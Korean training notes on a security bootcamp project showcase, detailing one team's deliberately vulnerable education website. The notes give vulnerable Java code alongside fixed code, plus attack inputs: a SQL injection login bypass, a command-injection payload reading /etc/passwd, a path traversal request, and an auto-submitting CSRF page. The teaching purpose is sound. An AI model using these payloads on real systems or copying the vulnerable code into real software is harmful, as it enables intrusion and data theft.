# 📝 보안 프로젝트 발표회 종합 학습 노트 (2일차 미니 프로젝트)

**작성일**: 2026년 1월 6일
**발표회 일시**: 2026년 1월 6일 오전 10시 ~ 오후 5시
**참여 팀**: 10개 팀 (SK Shielders Rookies 교육생)

---

## 🎯 학습 목표 및 개요

### 발표회 배경

이번 미니 프로젝트 발표회는 **SK Shielders Rookies** 교육 과정의 2차 미니 프로젝트 결과물을 공유하는 자리였습니다.
프로젝트 기간은 **2025년 12월 30일 ~ 2026년 1월 5일 (총 7일)** 로 매우 짧았지만, 모든 팀이 **실전 보안 프로젝트**를 완성도 높게 구현했습니다.

**💡 중요**: 이번 발표회는 단순한 결과 보고가 아니라, **실무에서 직접 적용 가능한 보안 진단 자동화 시스템**을 구축하고 검증하는 과정을 보여주는 자리였습니다.

### 프로젝트 공통 주제

모든 팀의 공통 과제는 다음과 같았습니다:

1. **취약한 웹 서비스 구축**: 실제 운영 환경과 유사한 웹 사이트 개발
2. **보안 취약점 의도적 삽입**: OWASP Top 10, KISA 가이드 기반 취약점 구현
3. **자동 진단 시스템 개발**: Python 기반 취약점 스캐너 개발
4. **진단 리포트 생성**: 취약점 발견 결과를 문서화

### 학습 목표

이 강의 노트를 통해 다음을 학습할 수 있습니다:

- ✅ **실전 보안 프로젝트 아키텍처 설계 방법**
- ✅ **다양한 도메인별 보안 고려사항** (교육, 의료, 금융, DNA, 자격시험 등)
- ✅ **OWASP Top 10 기반 웹 취약점 구현 및 진단 기법**
- ✅ **KISA 주요정보통신기반시설 취약점 진단 가이드 적용**
- ✅ **Python 기반 보안 진단 자동화 스크립트 개발**
- ✅ **AWS 기반 3-Tier 아키텍처 보안 구성**
- ✅ **SSH 터널링을 통한 원격 진단 기법**
- ✅ **진단 리포트 자동 생성 (마크다운, PDF, HTML, Excel)**
- ✅ **팀 프로젝트 협업 및 역할 분담 전략**

---

## 📊 발표 팀 전체 개요

총 10개 팀이 발표를 진행했으며, 각 팀의 주제와 특징은 다음과 같습니다:

| 팀 번호 | 팀명 | 프로젝트 주제 | 핵심 특징 |
|:---:|:---:|:---:|:---|
| **10조** | 위닝공돌이 아카데미 | 교육 현장 보안 | - 교육 분야 보안 위협 분석<br>- KISA 가이드 기반 40개 항목 진단<br>- 마크다운 리포트 자동 생성 |
| **7조** | (팀명 미공개) | LMS 서비스 보안 | - 플러그인 기반 확장 가능한 진단 도구<br>- Streamlit 대시보드<br>- Stryker AI 에이전트 연동 |
| **6조** | 합격 | 자격시험 통합 서비스 | - Next.js + Java RESTful API<br>- 셀레니움 기반 동적 진단<br>- SQL Injection 관리자 권한 탈취 시연 |
| **3조** | 헬릭스 (Helix) | DNA Lab 유전자 검사 | - 23andMe 사례 기반 설계<br>- 웹/OS 통합 스캐너<br>- PDF 리포트 자동 생성 |
| **2조** | 캠퍼스 가디언 | 대학 성적/학사 정보 | - 도커 기반 환경 구성<br>- 웹 크롤링 + 블랙박스/화이트박스 진단<br>- CSV 리포트 생성 |
| **1조** | (팀명 미공개) | 보안 소셜 커뮤니티 | - 생성형 AI 활용 진단<br>- 웹 UI 기반 진단 인터페이스<br>- cron 기반 주기적 진단 |
| **4조** | Safety Medical Center | 병원 웹사이트 보안 | - Flask 기반 EMR 시스템<br>- Streamlit 스캐너<br>- 의료 데이터 보호 중심 |
| **5조** | 오큐어 (Ocure) | 사내 그룹웨어 | - Spring Boot + React<br>- 블랙박스/화이트박스 분리 진단<br>- 11가지 영역 종합 진단 |
| **8조** | (팀명 미공개) | 금융권 서비스 | - 3-Tier 아키텍처<br>- SSH 터널링 원격 진단<br>- 로직 버그 탐지 (자기 자신 송금 시 잔액 증가) |
| **9조** | 화이트 가운 | 병원 웹사이트 보안 | - Tomcat 9 + MariaDB<br>- 프라이빗 서브넷 배치<br>- 스캔 아웃 서버 구성 |

---

## 🏗️ 공통 기술 스택 및 아키텍처 패턴

### 웹 개발 기술 스택

대부분의 팀이 다음과 같은 기술 조합을 사용했습니다:

#### 백엔드
- **Java**: Spring Boot, Tomcat (가장 많이 사용)
- **Python**: Flask (4조)
- **Node.js**: Next.js (6조)

#### 프론트엔드
- **JSP** (Java 기반 팀)
- **React** (5조)
- **HTML/CSS** (4조)

#### 데이터베이스
- **MySQL / MariaDB**: 대부분의 팀
- **RDS** (AWS 사용 팀)

#### 웹 서버
- **Nginx**: Reverse Proxy로 가장 많이 사용
- **Apache**: 일부 팀

### 인프라 아키텍처

#### 🔥 3-Tier 아키텍처 (가장 일반적)


**💡 핵심 설계 원칙:**
1. **웹 서버와 WAS 분리**: Nginx를 Reverse Proxy로 사용하여 정적 파일 서빙 및 로드 밸런싱
2. **프라이빗 서브넷 배치**: WAS와 DB는 외부에서 직접 접근 불가
3. **Bastion Host**: 관리자 접근 및 진단 스크립트 실행 경유지
4. **Load Balancer**: 가용성 및 확장성 확보

### 진단 도구 기술 스택

#### Python 기반 스캐너 (거의 모든 팀)

```python
# 공통적으로 사용된 라이브러리
import requests         # HTTP 요청
from bs4 import BeautifulSoup  # HTML 파싱
import paramiko         # SSH 연결
import pymysql          # DB 연결
import subprocess       # 쉘 명령어 실행
import re               # 정규표현식
import json             # 리포트 생성
```

#### 대시보드/UI
- **Streamlit**: 3조, 4조 (웹 기반 인터페이스)
- **CLI**: 대부분의 팀 (명령줄 인터페이스)
- **웹 UI**: 1조 (자체 웹 페이지로 진단 제어)

#### 리포트 형식
- **마크다운 (Markdown)**: 10조
- **PDF**: 3조, 7조, 9조
- **HTML**: 3조, 7조
- **Excel/CSV**: 2조, 5조
- **JSON**: 대부분의 팀 (중간 데이터 형식)

---

## 🔐 공통 진단 기준

모든 팀이 다음 두 가지 표준을 기준으로 진단 항목을 구성했습니다:

### 1. OWASP Top 10 (2021)

| 순위 | 취약점 | 설명 |
|:---:|:---:|:---|
| **A01** | Broken Access Control | 권한 검증 미흡, 수평/수직 권한 상승 |
| **A02** | Cryptographic Failures | 암호화 누락, 약한 암호화 알고리즘 |
| **A03** | Injection | SQL Injection, Command Injection, XSS |
| **A04** | Insecure Design | 비즈니스 로직 취약점, 설계 결함 |
| **A05** | Security Misconfiguration | 서버 설정 오류, 기본 설정 사용 |
| **A06** | Vulnerable Components | 취약한 라이브러리 사용 |
| **A07** | Identification and Authentication Failures | 세션 관리 취약점, 인증 우회 |
| **A08** | Software and Data Integrity Failures | 역직렬화 취약점 |
| **A09** | Security Logging Failures | 로깅 미흡, 모니터링 부재 |
| **A10** | Server-Side Request Forgery (SSRF) | 서버 측 요청 위조 |

### 2. KISA 주요정보통신기반시설 취약점 진단 가이드

- **OS 보안 (Unix/Linux)**: 계정 관리, 파일 권한, 서비스 설정 등 67개 항목
- **웹 서버 보안**: Nginx, Apache 설정 취약점
- **WAS 보안**: Tomcat 설정 및 관리 페이지 접근 제어
- **DB 보안**: 계정 관리, 권한 설정, 암호화 등
- **네트워크 보안**: 포트 개방 상태, 방화벽 정책

---

## 📅 발표 일정 및 진행 순서

**발표 순서**: 10조 → 7조 → 6조 → 3조 → (점심) → 2조 → 1조 → 4조 → 5조 → 8조 → 9조

**발표 시간**: 팀당 15-30분 (시간 제한 있었으나 유연하게 운영)

**질의응답**: 각 팀 발표 후 즉시 진행

**강사 총평**: 마지막에 전체 총평 진행

---

## 🎓 학습 포인트

이번 발표회에서 강조된 핵심 학습 포인트는 다음과 같습니다:

### 1. 실무 적용 가능성

**📌 강사 강조사항**: "이번 기수가 지금까지 본 미니 프로젝트 아웃풋 중 가장 우수했습니다."

- 최종 프로젝트에 바로 활용 가능한 수준의 구현
- 실제 운영 환경과 유사한 아키텍처 설계
- 확장성을 고려한 모듈형 구조

### 2. 협업 및 역할 분담

대부분의 팀이 다음과 같이 역할을 분담했습니다:

- **구축팀 (2-3명)**: 웹 사이트 개발 (프론트엔드 + 백엔드)
- **진단팀 (2-3명)**: 진단 스크립트 개발
- **인프라팀 (1-2명)**: AWS 환경 구축 및 네트워크 설정

### 3. 시간 관리의 중요성

⚠️ **주의사항**: 발표 시간 관리가 매우 중요합니다.
- 최종 프로젝트 발표 시 시간 초과는 최대 3분까지만 허용
- 핵심 내용에 집중하고, 구현 내용 위주로 발표 구성

### 4. 기술의 깊이 vs 다양성

💡 **인사이트**:
- 외부 도구(Stryker 등)를 활용하는 것도 좋지만, 핵심 기능은 직접 구현하는 것이 학습 효과가 높음
- 다양한 기술을 사용하되, 각 기술의 선택 이유와 장점을 명확히 설명할 수 있어야 함

---

## 🗺️ 강의 노트 구성

이 강의 노트는 다음과 같이 구성되어 있습니다:

1. **Section 1 (현재)**: 서론 및 발표회 개요
2. **Section 2**: 10조 (교육 현장) + 7조 (LMS) 프로젝트 상세 분석
3. **Section 3**: 6조 (자격시험) + 3조 (DNA Lab) 프로젝트 상세 분석
4. **Section 4**: 2조 (대학 포털) + 1조 (보안 커뮤니티) 프로젝트 상세 분석
5. **Section 5**: 4조 (병원) + 5조 (그룹웨어) 프로젝트 상세 분석
6. **Section 6**: 8조 (금융) + 9조 (병원) 프로젝트 상세 분석
7. **Section 7**: 통합 학습, 공통 패턴 정리, 실습 가이드, 종합 정리

---

다음 섹션에서는 **10조와 7조의 프로젝트**를 상세히 분석하겠습니다.
# Section 2-1: 10조 "위닝공돌이 아카데미" - 교육 현장 보안 프로젝트 상세 분석

---

## 🎯 2.1.1 팀 구성 및 역할 분담

### 팀 정보

**팀명**: 위닝공돌이 아카데미
**팀장**: 조남기
**팀원**: 김유영, 김주미, 전소원, 전민석 (총 5명)

### 역할 분담 전략

10조는 효율적인 협업을 위해 **구축팀 3명**과 **진단팀 2명**으로 역할을 분담했습니다.

| 역할 | 인원 | 주요 업무 |
|:---:|:---:|:---|
| **구축팀** | 3명 | - 웹 사이트 프론트엔드 개발 (JSP)<br>- 백엔드 API 개발 (Java/Servlet)<br>- 취약점 의도적 삽입<br>- 페이지별 기능 구현 |
| **진단팀** | 2명 | - Python 기반 진단 스크립트 개발<br>- KISA 가이드 기반 점검 로직 구성<br>- 마크다운 리포트 생성 자동화<br>- 수동 진단 가이드북 작성 |

**💡 협업 방식의 특징**:
- 구축팀과 진단팀이 **유기적으로 협업**하면서 진행
- 개발 완료 후 **전체 팀원이 함께 수동 진단** 수행
- 각자 역할은 분담했지만 마지막에는 **모든 취약점을 함께 검증**

---

## 📊 2.1.2 프로젝트 배경 및 목표

### 프로젝트 선정 배경

#### 교육 분야의 보안 위협 통계

10조가 교육을 주제로 선정한 이유는 명확한 통계 자료에 기반합니다:

**2025년 보안 공격 통계**:
- 교육 분야는 **주당 평균 4,300건 이상의 사이버 공격**을 받음
- **보안 취약 산업 1위**로 분류됨
- 대규모 학습자 정보를 보유하고 있으나 **보안 인력 부족**

**왜 교육 분야가 취약한가?**

```
교육 분야의 보안 취약점
├── 인력 부족
│   ├── 전문 보안 인력 배치 어려움
│   ├── 예산 제약
│   └── 보안 투자 우선순위 낮음
│
├── 대규모 개인정보 보유
│   ├── 학생 정보 (이름, 생년월일, 연락처)
│   ├── 학습 기록 및 성적 정보
│   ├── 학부모 정보
│   └── 교직원 정보
│
└── 다양한 접근 경로
    ├── 학생 계정 (수천~수만 개)
    ├── 교사 계정
    ├── 관리자 계정
    └── 외부 연동 시스템
```

### 프로젝트 목표

10조는 다음과 같은 명확한 목표를 설정했습니다:

1. **실제 교육 현장의 보안 위협 분석**
   - 실제 운영 환경과 유사한 취약 환경 구축
   - 현실적인 공격 시나리오 검증

2. **방화를 위한 가이드라인 제시**
   - KISA 주요정보통신기반시설 취약점 진단 가이드 적용
   - 자동 진단 시스템 구축

3. **팀 협업을 통한 실전 경험**
   - 구축팀과 진단팀의 유기적 협업
   - 전 팀원이 취약점을 직접 체험

---

## 🏗️ 2.1.3 시스템 아키텍처

### 전체 시스템 구성도

10조의 시스템은 **AWS EC2 기반**으로 구축되었으며, 다음과 같은 구조를 가집니다:


### 아키텍처 설계 원칙

#### 1. 포트 보안 정책

**MariaDB 포트 보안 설정**:
```bash
# MariaDB 3306 포트는 웹에서 접근할 수 없도록 설정
# 오직 로컬 소켓 또는 내부 네트워크에서만 접근 가능

# /etc/mysql/mariadb.conf.d/50-server.cnf
[mysqld]
bind-address = 127.0.0.1  # 외부 접근 차단
port = 3306
```

**핵심 포인트**:
- 3306 포트는 **외부에서 직접 접근 불가**
- Tomcat만 JDBC를 통해 내부적으로 접근
- 이는 **DB 직접 공격 차단**을 위한 기본 보안 조치

#### 2. Nginx Reverse Proxy 구성

**발표 중 질의응답에서 확인된 사항**:

**질문**: "Nginx를 Reverse Proxy로만 사용했는데, 사용 이유가 무엇인가요?"

**답변** (팀장 조남기):
> "사용자 편의를 위해서 URL 접속할 때 **80번 포트를 다른 포트번을 입력하는 것을 생략**하기 위해서 진행을 했고요.
> 이후에 **정적파일 서빙 성능 향상**과 **로드 밸런싱 확장 가능성**을 고려해서 Nginx를 앞단에 추가로 배치를 했습니다."

**Nginx 설정 예시**:
```nginx
# /etc/nginx/sites-available/academy.conf

server {
    listen 80;
    server_name academy.example.com;

    # 정적 파일 서빙 (성능 향상)
    location /static/ {
        alias /var/www/academy/static/;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }

    location /images/ {
        alias /var/www/academy/images/;
        expires 30d;
    }

    # 동적 요청은 Tomcat으로 프록시
    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

**장점**:
- ✅ 사용자는 80번 포트로 접속 (포트 번호 입력 불필요)
- ✅ 정적 파일은 Nginx가 직접 서빙 (Tomcat 부하 감소)
- ✅ 향후 로드 밸런싱 확장 가능 (Tomcat 2대 이상으로 확장 시)

---

## 🌐 2.1.4 웹 서비스 구현

### 웹 디렉토리 구조

10조의 웹 서비스는 **8개의 취약점이 의도적으로 삽입**된 교육 사이트입니다.

```
academy-website/
├── webapp/
│   ├── index.jsp                 # 메인 페이지
│   ├── login.jsp                 # 로그인 (SQL Injection 취약점)
│   ├── signup.jsp                # 회원가입 (비밀번호 정책)
│   ├── mypage.jsp                # 마이페이지 (Command Injection)
│   ├── materials.jsp             # 강의자료 (Path Traversal)
│   ├── questions.jsp             # 문의사항 (CSRF)
│   ├── notice.jsp                # 공지사항 (권한 검증 미흡)
│   ├── gallery.jsp               # 갤러리
│   ├── courses.jsp               # 수강신청
│   └── admin/
│       └── server-status.jsp     # 관리자 서버 상태 (Command Injection)
│
├── WEB-INF/
│   ├── web.xml
│   ├── lib/
│   └── classes/
│       └── com/academy/
│           ├── controller/       # 컨트롤러 (Servlet 기반)
│           ├── model/            # 모델 (DTO/DAO)
│           └── util/             # 유틸리티
│
└── resources/
    ├── css/
    ├── js/
    └── images/
```

### 페이지별 기능 및 취약점

#### 1. 메인 페이지 (index.jsp)

**기능**:
- 상단 네비게이션 바 (로그인, 회원가입, 강의자료, 문의사항, 공지사항, 갤러리, 수강신청)
- 메인 배너 이미지
- 주요 공지사항 미리보기

**시연 영상 설명**:
> "요게 홈 화면이고요. 네, 위쪽에 상단에 저렇게 기능 버튼들을 각 구현을 해놨습니다."

#### 2. 회원가입 페이지 (signup.jsp)

**기능**:
- 사용자 정보 입력 폼
- 비밀번호 정책 적용
- 약관 동의 체크박스

**시연 영상 설명**:
> "회원가입을 들어가게 되면 저희가 **실제 사용하는 환경과 유사하게** 이렇게 구성을 해놨고요.
> 비밀번호도 이렇게 **보안기준에 맞게 설정할 수 있게** 해놨습니다.
> 밑에 보시면은 **약관 정보도 볼 수 있도록** 이렇게 배치를 해놨고요."

**구현 코드 예시**:
```jsp
<!-- signup.jsp -->
<form action="signup" method="post">
    <input type="text" name="username" placeholder="아이디" required>
    <input type="email" name="email" placeholder="이메일" required>

    <!-- 비밀번호 정책: 8자 이상, 영문/숫자/특수문자 포함 -->
    <input type="password" name="password"
           placeholder="비밀번호 (8자 이상, 영문/숫자/특수문자)"
           pattern="^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!%*#?&]{8,}$"
           required>

    <input type="password" name="password_confirm" placeholder="비밀번호 확인" required>

    <!-- 약관 동의 -->
    <div class="terms">
        <label>
            <input type="checkbox" name="agree_terms" required>
            <a href="#" onclick="showTerms()">개인정보 처리방침</a> 및
            <a href="#" onclick="showPrivacy()">이용약관</a>에 동의합니다.
        </label>
    </div>

    <button type="submit">가입하기</button>
</form>
```

#### 3. 로그인 페이지 (login.jsp) - **SQL Injection 취약점**

**취약점**: SQL Injection을 통한 관리자 권한 탈취

**시연 영상 설명**:
> "이렇게 로그인 하게 되면 **관리자 권한으로 로그인**을 해서
> 여기 **서버 관리 버튼도 볼 수 있게** 만들어 놨습니다."

**취약한 로그인 처리 코드**:
```java
// LoginServlet.java (취약한 코드)
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String username = request.getParameter("username");
    String password = request.getParameter("password");

    // ⚠️ 취약점: SQL Injection 가능
    String sql = "SELECT * FROM users WHERE username='" + username
                 + "' AND password='" + password + "'";

    try {
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(sql);

        if (rs.next()) {
            // 로그인 성공
            session.setAttribute("user_id", rs.getString("id"));
            session.setAttribute("username", rs.getString("username"));
            session.setAttribute("role", rs.getString("role"));

            response.sendRedirect("index.jsp");
        } else {
            response.sendRedirect("login.jsp?error=1");
        }
    } catch (SQLException e) {
        e.printStackTrace();
    }
}
```

**공격 시나리오**:
```
사용자명: admin
비밀번호: ' OR '1'='1

생성되는 SQL:
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'

결과: 비밀번호 없이 admin 계정으로 로그인 성공
```

#### 4. 마이페이지 - 서버 상태 확인 (Command Injection 취약점)

**기능**: 관리자가 서버 상태를 확인할 수 있는 ping 기능

**취약점 시연**:
> "아까 말씀드렸던 관리자 마이 페이지 들어가면 **서버 상태 확인하는 버튼**이 있다고 했잖아요.
> 여기 들어오면 이 화면이 보입니다.
> 여기서 **입력값 조작으로 시스템 명령을 실행**하는 건데요."

**공격 예시**:
```
입력값: 8.8.8.8; cat /etc/passwd

실행되는 명령어:
ping -c 4 8.8.8.8; cat /etc/passwd

결과: /etc/passwd 파일 내용이 화면에 출력됨
```

**취약한 코드**:
```java
// ServerStatusServlet.java (취약한 코드)
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String ipAddress = request.getParameter("ip");

    // ⚠️ 취약점: Command Injection 가능
    String command = "ping -c 4 " + ipAddress;

    try {
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );

        String line;
        StringBuilder output = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        request.setAttribute("result", output.toString());
        request.getRequestDispatcher("server-status.jsp").forward(request, response);

    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

**올바른 수정 방법**:
```java
// 안전한 코드
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String ipAddress = request.getParameter("ip");

    // ✅ IP 주소 형식 검증
    if (!isValidIPAddress(ipAddress)) {
        response.getWriter().write("Invalid IP address");
        return;
    }

    // ✅ 배열 형태로 명령어 전달 (인젝션 방지)
    String[] command = {"ping", "-c", "4", ipAddress};

    try {
        ProcessBuilder pb = new ProcessBuilder(command);
        Process process = pb.start();
        // ... 나머지 코드
    } catch (IOException e) {
        e.printStackTrace();
    }
}

private boolean isValidIPAddress(String ip) {
    String regex = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}" +
                   "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
    return ip.matches(regex);
}
```

#### 5. 강의자료 페이지 (materials.jsp) - **Path Traversal 취약점**

**기능**:
- 관리자가 강의자료 업로드
- 학생이 강의자료 다운로드 및 검색

**시연 영상 설명**:
> "강의자료 페이지고요. 관리자가 강의자료를 올리는 화면입니다.
> 글쓰기 버튼으로 강의자료 업데이트 업로드를 가능하고요.
> 검색을 통해 가지고 이 강의자료 안에 있는 게시물들도 다 확인할 수 있도록 만들어 놨습니다."

**취약점 상세 설명**:
> "**패스 트래버셜**입니다. 요것도 네 루트 파일까지 들어가게 되는 그런 취약점 인데요.
> 요런 식으로 접근을 하게 직접 경로를 설정을 해서 사용을 해가지고 접근을 하게 되면
> 네 요 **패스워드 시스템 파일까지 이렇게 탈취**를 하는 요런 것까지 확인을 했습니다."

**공격 시나리오**:
```
정상 요청:
GET /download?file=lecture1.pdf

악의적 요청:
GET /download?file=../../../../etc/passwd

결과: /etc/passwd 파일 다운로드
```

**취약한 코드**:
```java
// DownloadServlet.java (취약한 코드)
protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    String filename = request.getParameter("file");
    String uploadPath = "/var/www/academy/uploads/";

    // ⚠️ 취약점: 경로 조작 가능
    File file = new File(uploadPath + filename);

    if (file.exists()) {
        // 파일 다운로드 처리
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition",
            "attachment; filename=\"" + filename + "\"");

        try (FileInputStream fis = new FileInputStream(file);
             OutputStream os = response.getOutputStream()) {

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

**안전한 코드**:
```java
// 안전한 코드
protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    String filename = request.getParameter("file");
    String uploadPath = "/var/www/academy/uploads/";

    // ✅ 파일명 정규화 및 검증
    File uploadDir = new File(uploadPath).getCanonicalFile();
    File file = new File(uploadDir, filename).getCanonicalFile();

    // ✅ 경로가 업로드 디렉토리 내에 있는지 확인
    if (!file.getCanonicalPath().startsWith(uploadDir.getCanonicalPath())) {
        response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid file path");
        return;
    }

    // ✅ 파일 존재 여부 확인
    if (!file.exists() || !file.isFile()) {
        response.sendError(HttpServletResponse.SC_NOT_FOUND, "File not found");
        return;
    }

    // 안전하게 파일 다운로드 처리
    // ... 나머지 코드
}
```

#### 6. 문의사항 페이지 (questions.jsp) - **CSRF 취약점**

**기능**:
- 학생이 질문 작성
- 관리자가 답변 작성

**시연 영상 설명**:
> "문의사항 페이지입니다. 이 식으로 답변 기능도 다 구현해 놨고요.
> 답변이 달려있는 것들은 **답변완료로 처리**해놨습니다."

**CSRF 취약점 시연**:
> "**CSRF**. 네 요거는 **섹션을 악용**을 해가지고 **사용자 모르게 요청을 수행**하는 그런 취약점입니다.
> 요것도 팀원끼리 다 확인했고요.
> 요런 식으로 하면 **DB에서 전소원님 정보가 삭제가 되는** 요런 곳까지 확인을 했습니다."

**CSRF 공격 예시**:
```html
<!-- 공격자가 작성한 악의적인 페이지 -->
<!DOCTYPE html>
<html>
<body>
    <h1>무료 상품권 받기!</h1>

    <!-- 사용자 모르게 자동으로 삭제 요청 전송 -->
    <form id="csrf-form" action="http://academy.example.com/deleteUser" method="POST">
        <input type="hidden" name="user_id" value="전소원">
    </form>

    <script>
        // 페이지 로드 시 자동 제출
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**방어 방법**:
```jsp
<!-- 안전한 코드: CSRF 토큰 사용 -->
<form action="deleteUser" method="POST">
    <!-- ✅ CSRF 토큰 추가 -->
    <input type="hidden" name="csrf_token" value="${sessionScope.csrf_token}">
    <input type="hidden" name="user_id" value="전소원">
    <button type="submit">회원 탈퇴</button>
</form>
```

```java
// Servlet에서 CSRF 토큰 검증
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String sessionToken = (String) request.getSession().getAttribute("csrf_token");
    String requestToken = request.getParameter("csrf_token");

    // ✅ 토큰 검증
    if (sessionToken == null || !sessionToken.equals(requestToken)) {
        response.sendError(HttpServletResponse.SC_FORBIDDEN, "CSRF token validation failed");
        return;
    }

    // 정상 처리
    // ...
}
```

#### 7. 공지사항 페이지 (notice.jsp) - **권한 검증 미흡**

**기능**:
- 관리자만 공지사항 작성 가능 (의도)
- 실제로는 일반 사용자도 작성 가능 (취약점)

**취약점 시연**:
> "공지사항 같은 경우는 **관리자만 공지사항을 올릴 수 있도록** 몰래 해야 되는데
> 요거는 **취약점을 심어 놓은 게 있습니다**."
>
> "**권한 검증 미흡** 요것도 아까 저희 공지사항에는 관리자만 올릴 수 있도록 설정을 해놨는데 그게 아니라
> **아임헤커라는 공지를 이미 어떤 사용자가** 네 **가짜 공지사항을 올리는** 요런 시뮬레이션까지 해봤고요.
> 네 이 **프리계정으로 공지사항을 등록하는데 성공**하는 요런 관리자 권한 요런 시스템 문제적인 것들도 확인을 했습니다."

**취약한 코드**:
```java
// NoticeServlet.java (취약한 코드)
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String title = request.getParameter("title");
    String content = request.getParameter("content");
    String author = (String) request.getSession().getAttribute("username");

    // ⚠️ 취약점: 권한 검증 없음
    String sql = "INSERT INTO notices (title, content, author) VALUES (?, ?, ?)";

    try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
        pstmt.setString(1, title);
        pstmt.setString(2, content);
        pstmt.setString(3, author);
        pstmt.executeUpdate();

        response.sendRedirect("notice.jsp");
    } catch (SQLException e) {
        e.printStackTrace();
    }
}
```

**안전한 코드**:
```java
// 안전한 코드
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String title = request.getParameter("title");
    String content = request.getParameter("content");

    // ✅ 권한 검증
    String userRole = (String) request.getSession().getAttribute("role");
    if (!"admin".equals(userRole)) {
        response.sendError(HttpServletResponse.SC_FORBIDDEN,
            "관리자만 공지사항을 작성할 수 있습니다.");
        return;
    }

    String author = (String) request.getSession().getAttribute("username");

    String sql = "INSERT INTO notices (title, content, author) VALUES (?, ?, ?)";
    // ... 나머지 코드
}
```

#### 8. 민감정보 노출 (Stored XSS + 평문 비밀번호)

**취약점 시연**:
> "**민감정보 노출** 요것도 DB에서 호출을 하게 되면
> **패스워드 같은 경우는 암호화가 되어있어야 되는데**
> **그냥 그대로 평문으로 추출 노출이 되는** 요런 문제점까지 확인을 했습니다.
> 요것도 그 취약점이 되게 안 좋은 그런 사례구요."

**DB 스키마 (취약한 버전)**:
```sql
-- 취약한 users 테이블
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    password VARCHAR(100) NOT NULL,  -- ⚠️ 평문 저장
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 데이터 예시
INSERT INTO users (username, email, password, role)
VALUES ('admin', 'admin@example.com', 'admin1234', 'admin');
```

**조회 시 문제점**:
```sql
SELECT * FROM users;

+----+----------+---------------------+-----------+-------+
| id | username | email               | password  | role  |
+----+----------+---------------------+-----------+-------+
|  1 | admin    | admin@example.com   | admin1234 | admin |
|  2 | student1 | student1@example.com| pass1234  | user  |
+----+----------+---------------------+-----------+-------+
```

**안전한 DB 스키마 및 처리**:
```sql
-- 안전한 users 테이블
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- ✅ 해시 저장
    salt VARCHAR(64) NOT NULL,             -- ✅ Salt 저장
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

```java
// 안전한 비밀번호 처리
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;

public class PasswordUtil {

    // 비밀번호 해시 생성
    public static String[] hashPassword(String password) throws Exception {
        // ✅ Salt 생성
        SecureRandom random = new SecureRandom();
        byte[] salt = new byte[32];
        random.nextBytes(salt);
        String saltStr = Base64.getEncoder().encodeToString(salt);

        // ✅ SHA-256 해시
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        md.update(salt);
        byte[] hash = md.digest(password.getBytes("UTF-8"));
        String hashStr = Base64.getEncoder().encodeToString(hash);

        return new String[]{hashStr, saltStr};
    }

    // 비밀번호 검증
    public static boolean verifyPassword(String password, String storedHash, String storedSalt)
            throws Exception {
        byte[] salt = Base64.getDecoder().decode(storedSalt);

        MessageDigest md = MessageDigest.getInstance("SHA-256");
        md.update(salt);
        byte[] hash = md.digest(password.getBytes("UTF-8"));
        String hashStr = Base64.getEncoder().encodeToString(hash);

        return hashStr.equals(storedHash);
    }
}
```

```java
// 회원가입 시 비밀번호 해시 저장
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String username = request.getParameter("username");
    String email = request.getParameter("email");
    String password = request.getParameter("password");

    try {
        // ✅ 비밀번호 해시 및 Salt 생성
        String[] hashAndSalt = PasswordUtil.hashPassword(password);
        String passwordHash = hashAndSalt[0];
        String salt = hashAndSalt[1];

        String sql = "INSERT INTO users (username, email, password_hash, salt) VALUES (?, ?, ?, ?)";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, username);
        pstmt.setString(2, email);
        pstmt.setString(3, passwordHash);
        pstmt.setString(4, salt);
        pstmt.executeUpdate();

    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

### 갤러리 및 수강신청 페이지

**시연 영상 설명**:
> "저희 프라인 팀원 분께서 다 찍어 준 사진을 업로드해서 구성해놨습니다.
> 페이지에서 이렇게 강의도 다 볼 수 있게 해놨고 수강신청 페이지로 넘어갈 수 있게 왔습니다."

**보안 관련 정보 제공**:
> "일단에 **보안기준이랑 개인정보 처리 지침 관련된** 요 정보들도 다 넣어 놨구요."

---

## 🔍 2.1.5 진단 디렉토리 구조

10조의 진단 시스템은 **확장성**을 염두에 두고 설계되었습니다.

